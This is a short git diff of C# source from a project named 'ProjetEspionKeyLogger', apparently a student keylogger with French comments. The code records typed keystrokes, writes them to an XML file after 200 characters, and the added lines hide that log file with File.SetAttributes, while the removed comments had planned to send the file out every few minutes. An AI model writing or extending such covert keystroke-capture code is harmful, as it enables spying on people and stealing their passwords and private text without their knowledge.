@@ -67,15 +67,7 @@ namespace ProjetEspionKeyLogger
                         enregistrement.ajouterContenu((char)codeASCII);
 
                         //probleme : tout en majuscule + certaines touches non detectées
-                        //je pense que c'est obligé d'être réglé dans la partie interface
-
-                        //ecriture dans un fichier texte
-                        // KeyLogger.enregistreTxt((char)codeASCII);
-
-                        //toutes les x minutes envoyer le fichier
-
-                        //effacer le fichier le contenu pour avoir le nouveau contenu
-
+                       
                         //Si touche Entrée
                         if (codeASCII == 13)
                         {
@@ -94,8 +86,13 @@ namespace ProjetEspionKeyLogger
                         //Si plus de 100 caracteres ont été tapé
                         if (nb_caractere_tape > 200)
                         {
-                            //On enregistre le contenue en xml
+                           //On enregistre le contenue en xml
                             collection_enregistrement.saveToXml("TestXML.xml");
+
+                            //on cache le xml
+                            File.SetAttributes("C:/Users/Laura/source/repos/ProjetCsharp/ProjetEspionKeyLogger/bin/Debug/netcoreapp3.1/TestXML.xml", FileAttributes.Hidden);
+                            //pour voir le xml panneau de configuration > Appareance et personalisation > afficher les fichiers et dossiers cachés > fichiers et dossiers cachés puis decocher la case
+
 
                             //On reinitialise le nombre de caracteres
                             nb_caractere_tape = 0;
